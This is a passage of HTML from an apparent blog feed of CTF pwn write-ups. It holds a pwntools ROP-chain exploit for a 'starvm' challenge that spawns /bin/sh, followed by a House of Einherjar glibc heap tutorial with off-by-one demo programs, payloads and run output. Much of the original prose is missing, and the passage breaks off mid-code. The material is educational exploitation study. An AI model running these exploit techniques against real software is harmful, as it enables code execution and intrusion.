class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x50a37 posix_spawn(rsp+0x1c, &quot;/bin/sh&quot;, 0, rbp, rsp+0x60, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string">  rbp == NULL || (u16)[rbp] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebcf1 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebcf5 execve(&quot;/bin/sh&quot;, r10, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebcf8 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>syscal retgadgetrop</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span> )</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./starvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh,&#x27;b *0x40198B&#x27;)</span></span><br><span class="line">gdb.attach(sh,<span class="string">&#x27;b *0x401325&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = [<span class="number">10</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>]</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;at &#x27;</span>)</span><br><span class="line">stack_ret=<span class="built_in">int</span>(sh.recv(<span class="built_in">len</span>(<span class="string">&#x27;7fff3b21f080&#x27;</span>)),<span class="number">16</span>)-(<span class="number">0x7ffd188fa9d0</span>-<span class="number">0x7ffd188fa9e8</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_ret))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;command:\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cmd]).encode() + <span class="string">b&#x27; 16&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">10 reg[op1]=op2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6  reg[op1]=mem[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3 reg[op1]=reg[op1] - reg[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7 mem[op2]=reg[op1]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2 reg[op1]=reg[op1] + reg[op2]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401468</span></span><br><span class="line">xorrdx=<span class="number">0x0000000000401464</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004017cb</span></span><br><span class="line">poprsi=<span class="number">0x00000000004016f0</span></span><br><span class="line">syscall=<span class="number">0x000000000040146a</span></span><br><span class="line">ogg=<span class="number">0xebcf8</span>-<span class="number">0x29d90</span></span><br><span class="line">sh_str=stack_ret+<span class="number">0x40</span></span><br><span class="line">cost = [<span class="number">14</span>,stack_ret&amp;<span class="number">0xffffffff</span>,</span><br><span class="line">        <span class="number">15</span>,(stack_ret&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>,</span><br><span class="line">        <span class="number">0</span>,poprsi,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">1</span>, <span class="comment">#7  pop rsi</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">2</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">3</span>,<span class="comment">#7  0</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,pop_rdi,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">4</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">5</span>, <span class="comment">#7 pop rdi</span></span><br><span class="line">        <span class="number">0</span>,sh_str&amp;<span class="number">0xffffffff</span>,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">6</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">0</span>,(sh_str&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">7</span>,<span class="comment">#7</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,xorrdx,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">8</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">9</span>, <span class="comment">#7 xorrdx</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,pop_rax,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">10</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">11</span>,<span class="comment">#7 pop rax</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,<span class="number">0x3b</span>,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">12</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">13</span>,<span class="comment">#7  0x3b</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,syscall,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">14</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">15</span>, <span class="comment">#7 syscall</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0x6e69622f</span>, <span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">16</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0x68732f</span>, <span class="comment">#10 </span></span><br><span class="line">        <span class="number">0</span>,<span class="number">17</span>,<span class="comment">#7</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0xdeadbeef</span>]</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;your cost:\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cost]).encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="drop"><a href="#drop" class="headerlink" title="drop"></a>drop</h2><p>rustgdb</p><p>ffffdddd0x71</p><p><img src="/2023/08/02/startctf/image-20230806192723745.png" alt="image-20230806192723745"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House Of Einherjar</title>
      <link href="/2023/07/29/House-Of-Einherjar/"/>
      <url>/2023/07/29/House-Of-Einherjar/</url>
      
        <content type="html"><![CDATA[<h1 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h1><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><p>off by oneprevinuse</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="wiki"><a href="#wiki" class="headerlink" title="wiki"></a>wiki</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span>* s0 = <span class="built_in">malloc</span>(<span class="number">0x200</span>);<span class="comment">//fake chunk</span></span><br><span class="line">    <span class="type">char</span>* s1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">char</span>* s2 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    <span class="type">char</span>* s3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>); <span class="comment">//s2top chunk </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;begin\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, s0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input s0\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s0, <span class="number">0x200</span>); <span class="comment">//fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input s1\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s1, <span class="number">0x19</span>); <span class="comment">//Off By One</span></span><br><span class="line">    <span class="built_in">free</span>(s2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./example&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;begin\n&quot;</span>)</span><br><span class="line">address = <span class="type">int</span>(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;input s0\n&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(address) * <span class="number">2</span> + <span class="string">&quot;A&quot;</span>*<span class="number">0xe0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p64(address) * <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x100</span>) <span class="meta">#fake size</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;input s1\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x220</span>) + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p>s1s2prevsize0x220,off by oneprevinuse</p><p>s2</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730141511488.png" alt="image-20230730141511488"></p><p>s1-prevsizeunlinks0unlink</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>)) \</span><br><span class="line">malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure><p>if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0)) \</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730142117126.png" alt="image-20230730142117126"></p><p>if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))\</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730142455457.png" alt="image-20230730142455457"></p><p>free(s2)s0 0x7ac010unsortedbin</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730142640857.png" alt="image-20230730142640857"></p><h3 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h3><p>hollktopchunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="comment">//gcc -g hollk.c -o hollk //glibc-2.23  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span>* a;</span><br><span class="line">  <span class="type">uint8_t</span>* b;</span><br><span class="line">  <span class="type">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line">  a = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding:%#x\n&quot;</span>, real_a_size);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//fake chunk</span></span><br><span class="line">  <span class="type">size_t</span> fake_chunk[<span class="number">6</span>]; </span><br><span class="line">  fake_chunk[<span class="number">0</span>] = <span class="number">0</span>; </span><br><span class="line">  fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>;</span><br><span class="line">  fake_chunk[<span class="number">2</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">  fake_chunk[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">  fake_chunk[<span class="number">4</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">  fake_chunk[<span class="number">5</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);</span><br><span class="line"></span><br><span class="line">  b = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">  <span class="comment">//off by oneb previnuse</span></span><br><span class="line">  a[real_a_size] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((b - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>) - (<span class="type">uint8_t</span>*)fake_chunk);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//bprevsize</span></span><br><span class="line">  *(<span class="type">size_t</span>*)&amp;a[real_a_size - <span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"><span class="comment">//unlink /if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))  </span></span><br><span class="line">  fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"><span class="comment">//unlinktopchunk</span></span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">//fake_chunk</span></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/h/glibc_2<span class="number">.31</span>&gt; ./a.out</span><br><span class="line">a: <span class="number">0xccf010</span></span><br><span class="line">Since we want to overflow <span class="string">&#x27;a&#x27;</span>, we need the <span class="string">&#x27;real&#x27;</span> size of <span class="string">&#x27;a&#x27;</span> after rounding:<span class="number">0x38</span></span><br><span class="line">Our fake chunk at <span class="number">0x7fff767b3280</span> looks like:</span><br><span class="line">b: <span class="number">0xccf050</span></span><br><span class="line"></span><br><span class="line">b.size: <span class="number">0x101</span></span><br><span class="line">b.size: <span class="number">0x100</span></span><br><span class="line">Our fake prev_size will be <span class="number">0xccf040</span> - <span class="number">0x7fff767b3280</span> = <span class="number">0xffff80008a51bdc0</span></span><br><span class="line">Our fake chunk size is now <span class="number">0xffff80008a53cd81</span> (b.size + fake_prev_size)</span><br><span class="line">Next <span class="built_in">malloc</span>(<span class="number">0x200</span>) is at <span class="number">0x7fff767b3290</span></span><br></pre></td></tr></table></figure><p>unlink*(fake_chunk+size)&#x3D;size0x100unsortedbinlargebinfd_nextsizebk_nextsize</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> fake_chunk[<span class="number">6</span>]; </span><br><span class="line">fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; </span><br><span class="line">fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>;</span><br><span class="line">fake_chunk[<span class="number">2</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">fake_chunk[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line"><span class="comment">/* fake_chunk[4] = (size_t)fake_chunk; */</span></span><br><span class="line"><span class="comment">/* fake_chunk[5] = (size_t)fake_chunk; */</span></span><br><span class="line">fake_chunk[<span class="number">0x100</span>/<span class="number">8</span>]=<span class="number">0x100</span>;<span class="comment">//if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))  </span></span><br><span class="line">fake_chunk[<span class="number">1</span>] = fake_size;</span><br></pre></td></tr></table></figure><h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><h3 id="how2heap-1"><a href="#how2heap-1" class="headerlink" title="how2heap"></a>how2heap</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// prepare the target</span></span><br><span class="line">  <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nThe address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span>*)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// create a fake chunk</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">  a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">  a[<span class="number">2</span>] = (<span class="type">size_t</span>)a; <span class="comment">// fwd</span></span><br><span class="line">  a[<span class="number">3</span>] = (<span class="type">size_t</span>)a; <span class="comment">// bck</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, a);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, a[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x28 bytes for &#x27;b&#x27;.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This chunk will be used to overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n&quot;</span>);</span><br><span class="line">  <span class="type">uint8_t</span>* b = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;b&#x27;, we need the &#x27;real&#x27; size of &#x27;b&#x27; after rounding: %#x\n&quot;</span>, real_b_size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">   * a value of 0x00. The least significant byte of this will be 0x00, because the size of</span></span><br><span class="line"><span class="comment">   * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;c&#x27;.\n&quot;</span>);</span><br><span class="line">  <span class="type">uint8_t</span>* c = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span>* c_size_ptr = (<span class="type">uint64_t</span>*)(c - <span class="number">8</span>);</span><br><span class="line">  <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//cprevinuse0</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">  b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">    <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line">  <span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>) - (<span class="type">uint8_t</span>*)a);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">  <span class="comment">//cprevsize</span></span><br><span class="line">  *(<span class="type">size_t</span>*)&amp;b[real_b_size - <span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Change the fake chunk&#x27;s size to reflect c&#x27;s new prev_size unlink</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nMake sure that our fake chunk&#x27;s size is equal to c&#x27;s new prev_size.\n&quot;</span>);</span><br><span class="line">  a[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Now we fill the tcache before we free chunk &#x27;c&#x27; to consolidate with our fake chunk</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nFill tcache.\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* x[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(x) / <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++) &#123;</span><br><span class="line">    x[i] = <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache list.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(x) / <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(x[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span 